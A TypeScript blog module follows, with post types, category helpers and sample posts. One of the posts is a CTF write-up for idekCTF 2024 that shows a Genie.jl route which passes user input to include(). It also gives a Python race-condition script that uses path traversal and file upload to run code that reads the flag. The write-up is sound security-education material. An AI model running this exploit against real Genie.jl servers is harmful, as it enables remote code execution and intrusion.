// This file contains types and utility functions that are safe for client-side use

export type PostOwner = {
  id: string
  name: string
  avatar_url: string
  type: string
  person?: {
    email: string
  }
}

export type Post = {
  id: string
  slug: string
  title: string
  excerpt: string
  content: string
  createdAt: string
  updatedAt: string
  coverImage: string
  iconEmoji?: string
  categories: string[]
  verification: {
    state: string
    verified_by: string | null
    date: string | null
  }
  owner?: PostOwner
  notionUrl?: string | null
  wordCount?: number
}

// Client-safe utility functions
export function getAllCategories(posts: Post[]): string[] {
  const categories = new Set<string>()

  posts.forEach((post) => {
    post.categories.forEach((category) => {
      categories.add(category)
    })
  })

  return Array.from(categories)
}

export function getPostsByCategory(posts: Post[], category: string): Post[] {
  return posts.filter((post) => post.categories.includes(category))
}

// Sample posts for client-side preview and fallback
export const samplePosts: Post[] = [
  {
    id: "sample-post-1",
    slug: "sample-post-1",
    title: "Welcome to Your Interactive Blog",
    excerpt: "This is a sample post to demonstrate the blog functionality.",
    content: `<h1>Welcome to Your Interactive Blog</h1>
<p>This is a sample post that demonstrates the functionality of your interactive blog. You can replace this with your own content.</p>
<h2>Features</h2>
<ul>
  <li>Markdown support</li>
  <li>Syntax highlighting</li>
  <li>Categories and tags</li>
  <li>Responsive design</li>
</ul>
<p>Here's a code example:</p>
<pre><code class="language-python">def hello_world():
    print("Hello, world!")

hello_world()</code></pre>`,
    createdAt: "2024-05-01T12:00:00.000Z",
    updatedAt: "2024-05-01T12:00:00.000Z",
    coverImage: "/placeholder.svg?height=600&width=1200",
    iconEmoji: "👋",
    categories: ["General", "Introduction"],
    verification: {
      state: "verified",
      verified_by: "Admin",
      date: "2024-05-01T12:00:00.000Z",
    },
  },
  {
    id: "sample-post-2",
    slug: "sample-post-2",
    title: "How to Format Your Blog Posts",
    excerpt: "Learn how to format your blog posts using Markdown and HTML.",
    content: `<h1>How to Format Your Blog Posts</h1>
<p>This guide will show you how to format your blog posts using Markdown and HTML.</p>
<h2>Markdown Basics</h2>
<p>Markdown is a lightweight markup language that you can use to add formatting elements to plaintext text documents.</p>
<h3>Headers</h3>
<pre><code class="language-markdown"># Heading 1
## Heading 2
### Heading 3</code></pre>
<h3>Emphasis</h3>
<pre><code class="language-markdown">*italic*
**bold**
***bold and italic***</code></pre>
<h3>Lists</h3>
<pre><code class="language-markdown">- Item 1
- Item 2
  - Subitem 2.1
  - Subitem 2.2
- Item 3

1. First item
2. Second item
3. Third item</code></pre>`,
    createdAt: "2024-05-02T12:00:00.000Z",
    updatedAt: "2024-05-02T12:00:00.000Z",
    coverImage: "/placeholder.svg?height=600&width=1200",
    iconEmoji: "📝",
    categories: ["Tutorial", "Markdown"],
    verification: {
      state: "verified",
      verified_by: "Admin",
      date: "2024-05-02T12:00:00.000Z",
    },
  },
  {
    id: "arbitrary-file-inclusion",
    slug: "arbitrary-file-inclusion",
    title: "Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]",
    excerpt:
      "In idekCTF 2024, I played with the P1G SEKAI team and secured 1st place out of 1,068 teams! I solved a challenge named 'Included me' and got the first blood on that challenge.",
    content: `<h1>Arbitrary File Inclusion Leading to RCE in Genie.jl</h1>
<p>In idekCTF 2024, I played with the <strong>P1G SEKAI</strong> team and secured 1st place out of 1,068 teams! I solved a challenge named "Included me" and got the first blood on that challenge.</p>
<h2>Challenge Description</h2>
<p>Another minimalist, frontend-less, challenge because I'm bad at writing server-side challenges.</p>
<h2>How to Solve</h2>
<p>The goal of this challenge was to achieve Remote Code Execution (RCE) and capture the flag. The program was vulnerable to arbitrary file inclusion here:</p>
<pre><code class="language-julia">using Genie, Genie.Requests, Pkg

Pkg.activate(".")

index() = include(params(:page, "example.jl"))

route("/", index)

up(1337, "0.0.0.0", async = false)</code></pre>
<p>We could include arbitrary files into the application, altering its flow. I discovered that we could include a test case from this Genie.jl repository.</p>
<p>This test case essentially exposes a file upload vulnerability, allowing us to upload arbitrary files into Genie. However, after including that file, the program's flow would change, preventing us from doing it a second time… or would it? The solution is yes, we can include it again if we're fast enough to include <code>app.jl</code> right after uploading the file. This requires a race condition.</p>
<h2>Solution Script</h2>
<pre><code class="language-python">import httpx
import asyncio

URL = "http://localhost:1337"
# URL = "https://includeme-295e03fffda9795f.instancer.idek.team/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url, timeout=100)
    def page(self, page):
        return self.c.get("/", params={"page": page})
    def upload(self, fileupload):
        return self.c.post("/", files={"fileupload": ("x.jl", fileupload)})
class API(BaseAPI):
    ...

async def main():
    api = API()
    ress = []
    res1 = api.page("../home/ctf/.julia/packages/Genie/yQwwj/test/fileuploads/test.jl")
    ress.append(res1)
    for i in range(10):
        res2 = api.upload("""
read(\`cat flag.txt\`, String)
""")
        for j in range(10):
            res3 = api.page("app.jl")
            ress.append(res3)
        ress.extend([res1, res2])
    ress = await asyncio.gather(*ress)
    for res in ress:
        print(res.text)

if __name__ == "__main__":
    asyncio.run(main())</code></pre>
<p>Next, visit <a href="http://localhost:1337/?page=x.jl">http://localhost:1337/?page=x.jl</a> to retrieve the flag.</p>
<p>Here's a diagram of the exploit flow:</p>
<img src="/placeholder.svg?height=400&width=600&text=Exploit%20Flow%20Diagram" alt="Exploit Flow Diagram">`,
    createdAt: "2024-08-19T00:24:00.000Z",
    updatedAt: "2024-09-28T00:27:00.000Z",
    coverImage: "/placeholder.svg?height=600&width=1200",
    iconEmoji: "🏎️",
    categories: ["CTF", "Web Security", "RCE"],
    verification: {
      state: "unverified",
      verified_by: null,
      date: null,
    },
    owner: {
      id: "ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa",
      name: "Dimas",
      avatar_url: "/placeholder.svg?height=100&width=100",
      type: "person",
      person: {
        email: "dimasmaulana0305@gmail.com",
      },
    },
  },
]
